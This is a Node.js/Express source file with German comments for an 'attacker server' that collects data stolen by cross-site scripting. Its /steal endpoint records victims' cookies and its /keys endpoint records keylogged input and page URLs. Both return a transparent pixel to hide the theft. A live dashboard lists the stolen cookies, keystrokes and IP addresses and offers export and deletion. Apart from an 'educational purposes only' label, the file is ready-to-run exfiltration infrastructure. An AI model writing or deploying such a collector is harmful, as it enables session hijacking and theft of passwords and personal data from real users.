const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Datenbank
const DB_FILE = path.join(__dirname, 'stolen_data.json');
let stolenData = [];

// Lade Daten beim Start
try {
    if (fs.existsSync(DB_FILE)) {
        stolenData = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
        console.log(`[DB] ${stolenData.length} Einträge geladen`);
    }
} catch (err) {
    console.error('[DB] Fehler:', err.message);
}

// Speichern
function saveToDatabase() {
    fs.writeFileSync(DB_FILE, JSON.stringify(stolenData, null, 2));
}

// Session-ID generieren
function generateSessionId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 7);
    return `sess_${timestamp}_${random}`;
}

// Cookie Steal Endpoint
app.get('/steal', (req, res) => {
    const cookieString = req.query.c || '';
    const timestamp = new Date().toISOString();
    const sessionId = generateSessionId();
    const ip = req.ip;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';

    // Parse Cookies
    const cookies = {};
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.trim().split('=');
        if (parts.length === 2) {
            cookies[parts[0]] = parts[1];
        }
    });

    console.log('\n' + '═'.repeat(80));
    console.log('🍪 COOKIE THEFT');
    console.log('═'.repeat(80));
    console.log(`Session:   ${sessionId}`);
    console.log(`IP:        ${ip}`);
    console.log(`Zeit:      ${timestamp}`);
    console.log(`Referer:   ${referer}`);
    console.log(`Cookies:   ${Object.keys(cookies).length} Einträge`);
    Object.entries(cookies).forEach(([key, value]) => {
        console.log(`  - ${key}: ${value.substring(0, 40)}${value.length > 40 ? '...' : ''}`);
    });
    console.log('═'.repeat(80) + '\n');

    stolenData.push({
        sessionId,
        type: 'COOKIE_THEFT',
        timestamp,
        ip,
        referer,
        userAgent,
        cookies
    });

    saveToDatabase();

    // Sende transparentes Pixel
    res.set('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// Keylogger Endpoint
app.get('/keys', (req, res) => {
    const keys = req.query.d || '';
    const url = req.query.u || 'Unknown';
    const timestamp = new Date().toISOString();
    const sessionId = generateSessionId();
    const ip = req.ip;

    console.log('\n' + '═'.repeat(80));
    console.log('⌨️  KEYLOGGER');
    console.log('═'.repeat(80));
    console.log(`Session:   ${sessionId}`);
    console.log(`IP:        ${ip}`);
    console.log(`Zeit:      ${timestamp}`);
    console.log(`URL:       ${url}`);
    console.log(`Eingabe:   "${keys.substring(0, 100)}${keys.length > 100 ? '...' : ''}"`);
    console.log(`Länge:     ${keys.length} Zeichen`);
    console.log('═'.repeat(80) + '\n');

    stolenData.push({
        sessionId,
        type: 'KEYLOGGER',
        timestamp,
        ip,
        url,
        keystrokes: keys
    });

    saveToDatabase();

    res.set('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// Dashboard
app.get('/dashboard', (req, res) => {
    const cookieThefts = stolenData.filter(d => d.type === 'COOKIE_THEFT');
    const keylogs = stolenData.filter(d => d.type === 'KEYLOGGER');
    const uniqueIPs = [...new Set(stolenData.map(d => d.ip))];

    res.send(`
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daten Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f5f5f5;
            color: #212529;
        }
        .header {
            background: white;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 28px;
            text-align: center;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-card h3 {
            color: #6c757d;
            font-size: 14px;
            margin-bottom: 10px;
        }
        .stat-card .value {
            font-size: 36px;
            font-weight: bold;
        }
        .section {
            background: white;
            padding: 25px;
            border-radius: 8px;
            margin-bottom: 25px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .section h2 {
            margin-bottom: 20px;
            font-size: 20px;
            border-bottom: 2px solid #e0e0e0;
            padding-bottom: 10px;
        }
        .data-entry {
            background: #f8f9fa;
            padding: 20px;
            margin-bottom: 15px;
            border-radius: 8px;
            border-left: 4px solid #212529;
        }
        .data-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        .type-badge {
            padding: 5px 12px;
            background: #212529;
            color: white;
            border-radius: 4px;
            font-size: 12px;
        }
        .session-id {
            color: #6c757d;
            font-size: 12px;
        }
        .data-field {
            margin: 10px 0;
            padding: 12px;
            background: white;
            border-left: 3px solid #e0e0e0;
            border-radius: 3px;
        }
        .data-label {
            color: #6c757d;
            font-weight: 500;
            font-size: 13px;
            margin-bottom: 5px;
        }
        .data-value {
            color: #212529;
            word-break: break-all;
            font-family: monospace;
        }
        .cookie-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }
        .cookie-item {
            background: white;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #e0e0e0;
            font-size: 12px;
        }
        .cookie-name {
            font-weight: 500;
            margin-bottom: 5px;
        }
        .cookie-value {
            color: #6c757d;
            word-break: break-all;
        }
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
            margin: 10px 5px;
        }
        .btn-danger { background: #dc3545; color: white; }
        .btn-success { background: #28a745; color: white; }
        .no-data { text-align: center; padding: 60px; color: #6c757d; }
        .auto-refresh { text-align: center; color: #6c757d; margin-top: 20px; font-size: 12px; }
    </style>
    <script>
        function clearData() {
            if (confirm('Alle Daten löschen?')) {
                fetch('/clear', { method: 'POST' }).then(() => location.reload());
            }
        }
        function exportData() {
            fetch('/export').then(res => res.blob()).then(blob => {
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = 'stolen_data_' + Date.now() + '.json';
                a.click();
            });
        }
        setTimeout(() => location.reload(), 10000);
    </script>
</head>
<body>
    <div class="header">
        <h1>Daten Dashboard</h1>
    </div>
    <div class="container">
        <div class="warning">⚠️ Nur für Bildungszwecke</div>

        <div class="stats">
            <div class="stat-card">
                <h3>Gesamt</h3>
                <div class="value">${stolenData.length}</div>
            </div>
            <div class="stat-card">
                <h3>Cookies</h3>
                <div class="value">${cookieThefts.length}</div>
            </div>
            <div class="stat-card">
                <h3>Keylogger</h3>
                <div class="value">${keylogs.length}</div>
            </div>
            <div class="stat-card">
                <h3>Unique IPs</h3>
                <div class="value">${uniqueIPs.length}</div>
            </div>
        </div>

        <div class="section">
            <h2>Empfangene Daten</h2>
            ${stolenData.length === 0 ? '<div class="no-data">Noch keine Daten empfangen...</div>' :
                stolenData.slice().reverse().map(entry => `
                    <div class="data-entry">
                        <div class="data-header">
                            <span class="type-badge">${entry.type}</span>
                            <span class="session-id">Session: ${entry.sessionId}</span>
                        </div>
                        <div class="data-field">
                            <div class="data-label">IP-Adresse</div>
                            <div class="data-value">${entry.ip}</div>
                        </div>
                        <div class="data-field">
                            <div class="data-label">Zeitstempel</div>
                            <div class="data-value">${entry.timestamp}</div>
                        </div>
                        ${entry.type === 'COOKIE_THEFT' ? `
                            <div class="data-field">
                                <div class="data-label">Cookies (${Object.keys(entry.cookies || {}).length} Einträge)</div>
                                <div class="cookie-grid">
                                    ${Object.entries(entry.cookies || {}).map(([key, value]) => `
                                        <div class="cookie-item">
                                            <div class="cookie-name">${key}</div>
                                            <div class="cookie-value">${value.substring(0, 30)}${value.length > 30 ? '...' : ''}</div>
                                        </div>
                                    `).join('')}
                                </div>
                            </div>
                            <div class="data-field">
                                <div class="data-label">Referer</div>
                                <div class="data-value">${entry.referer}</div>
                            </div>
                        ` : ''}
                        ${entry.type === 'KEYLOGGER' ? `
                            <div class="data-field">
                                <div class="data-label">Tastatureingaben (${entry.keystrokes.length} Zeichen)</div>
                                <div class="data-value">"${entry.keystrokes}"</div>
                            </div>
                            <div class="data-field">
                                <div class="data-label">URL</div>
                                <div class="data-value">${entry.url}</div>
                            </div>
                        ` : ''}
                    </div>
                `).join('')
            }
        </div>

        <div style="text-align: center;">
            <button class="btn btn-success" onclick="exportData()">Daten exportieren</button>
            <button class="btn btn-danger" onclick="clearData()">Daten löschen</button>
        </div>

        <div class="auto-refresh">Auto-Aktualisierung in 10 Sekunden...</div>
    </div>
</body>
</html>
    `);
});

// Export
app.get('/export', (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="stolen_data_${Date.now()}.json"`);
    res.send(JSON.stringify(stolenData, null, 2));
});

// Clear
app.post('/clear', (req, res) => {
    stolenData = [];
    saveToDatabase();
    console.log('\n🗑️  Datenbank gelöscht\n');
    res.json({ status: 'cleared' });
});

// Start
app.listen(port, () => {
    console.clear();
    console.log('\n' + '═'.repeat(60));
    console.log('  ATTACKER SERVER GESTARTET');
    console.log('═'.repeat(60));
    console.log(`\nServer:       http://localhost:${port}`);
    console.log(`Dashboard:    http://localhost:${port}/dashboard`);
    console.log(`Datenbank:    ${DB_FILE}`);
    console.log(`\nEndpoints:`);
    console.log(`  GET  /steal?c=<cookies>  - Cookie theft`);
    console.log(`  GET  /keys?d=<keys>&u=<url> - Keylogger`);
    console.log(`  GET  /dashboard          - Dashboard`);
    console.log(`  GET  /export             - Export data`);
    console.log('\n' + '═'.repeat(60));
    console.log('\n⚠️  Nur für Bildungszwecke!\n');
    console.log('[*] Warte auf Daten...\n');
});
